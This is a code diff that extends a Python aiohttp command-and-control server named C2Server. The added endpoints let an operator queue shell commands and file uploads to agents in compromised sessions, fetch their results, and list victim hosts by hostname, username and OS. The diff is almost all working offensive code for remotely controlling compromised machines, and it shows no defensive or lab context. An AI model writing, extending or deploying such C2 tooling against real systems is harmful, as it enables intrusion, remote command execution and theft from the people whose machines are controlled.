@@ -59,11 +59,17 @@ class C2Server:
 
     def _setup_routes(self) -> None:
         """Set up HTTP routes for C2 communication."""
+        # Agent endpoints
         self.app.router.add_post("/beacon", self.handle_beacon)
         self.app.router.add_post("/register", self.handle_register)
         self.app.router.add_get("/tasks/{session_id}", self.handle_get_tasks)
         self.app.router.add_post("/results/{session_id}", self.handle_post_results)
+        
+        # Operator/CLI endpoints
         self.app.router.add_get("/health", self.handle_health)
+        self.app.router.add_post("/api/command", self.handle_api_queue_command)
+        self.app.router.add_get("/api/result/{session_id}/{task_id}", self.handle_api_get_result)
+        self.app.router.add_get("/api/sessions", self.handle_api_list_sessions)
 
     async def handle_health(self, request: web.Request) -> web.Response:
         """Health check endpoint."""
@@ -220,6 +226,118 @@ class C2Server:
             
         except Exception as e:
             logger.error(f"Error handling results: {e}")
+            return web.json_response({"error": str(e)}, status=500)
+
+    async def handle_api_queue_command(self, request: web.Request) -> web.Response:
+        """
+        API endpoint for operator to queue commands.
+        
+        Used by CLI tools to send commands to agents.
+        """
+        try:
+            data = await request.json()
+            session_id = data.get("session_id")
+            command = data.get("command")
+            command_type = data.get("type", "execute")
+            
+            if not session_id or not command:
+                return web.json_response({"error": "Missing session_id or command"}, status=400)
+            
+            # Verify session exists
+            session = self.session_manager.get_session(session_id)
+            if not session:
+                return web.json_response({"error": "Session not found"}, status=404)
+            
+            # Generate task ID
+            import time
+            task_id = f"task_{int(time.time() * 1000)}"
+            
+            # Queue the command
+            if session_id not in self.command_queues:
+                self.command_queues[session_id] = asyncio.Queue()
+            
+            task = {
+                "id": task_id,
+                "type": command_type,
+                "command": command,
+                "timestamp": datetime.now().isoformat()
+            }
+            
+            if command_type == "upload":
+                task["remote_path"] = data.get("remote_path")
+                task["data"] = data.get("data")
+                task["filename"] = data.get("filename")
+            
+            await self.command_queues[session_id].put(task)
+            logger.info(f"API: Queued {command_type} command for session {session_id}")
+            
+            return web.json_response({
+                "status": "ok",
+                "task_id": task_id,
+                "session_id": session_id
+            })
+            
+        except Exception as e:
+            logger.error(f"Error in API queue command: {e}")
+            return web.json_response({"error": str(e)}, status=500)
+
+    async def handle_api_get_result(self, request: web.Request) -> web.Response:
+        """
+        API endpoint for operator to retrieve command results.
+        """
+        try:
+            session_id = request.match_info["session_id"]
+            task_id = request.match_info["task_id"]
+            
+            # Check if result is ready
+            if session_id in self.responses and task_id in self.responses[session_id]:
+                result = self.responses[session_id][task_id]
+                return web.json_response({
+                    "status": "completed",
+                    "result": result
+                })
+            else:
+                return web.json_response({
+                    "status": "pending"
+                }, status=404)
+                
+        except Exception as e:
+            logger.error(f"Error in API get result: {e}")
+            return web.json_response({"error": str(e)}, status=500)
+
+    async def handle_api_list_sessions(self, request: web.Request) -> web.Response:
+        """
+        API endpoint for operator to list sessions.
+        """
+        try:
+            status_filter = request.query.get("status", "all")
+            
+            all_sessions = self.session_manager.list_sessions()
+            
+            if status_filter == "active":
+                sessions = [s for s in all_sessions if s.status == SessionStatus.ACTIVE]
+            elif status_filter == "inactive":
+                sessions = [s for s in all_sessions if s.status == SessionStatus.INACTIVE]
+            else:
+                sessions = all_sessions
+            
+            session_data = [
+                {
+                    "session_id": s.session_id,
+                    "target": s.metadata.get("hostname", "unknown"),
+                    "username": s.metadata.get("username", "unknown"),
+                    "os": s.metadata.get("os", "unknown"),
+                    "status": s.status.value,
+                    "last_seen": s.last_seen.isoformat() if s.last_seen else None,
+                    "created_at": s.created_at.isoformat()
+                }
+                for s in sessions
+            ]
+            
+            return web.json_response({"sessions": session_data})
+            
+        except Exception as e:
+            logger.error(f"Error in API list sessions: {e}")
             return web.json_response({"error": str(e)}, status=500)
 
     async def queue_command(self, session_id: str, command: str, task_id: Optional[str] = None) -> str:
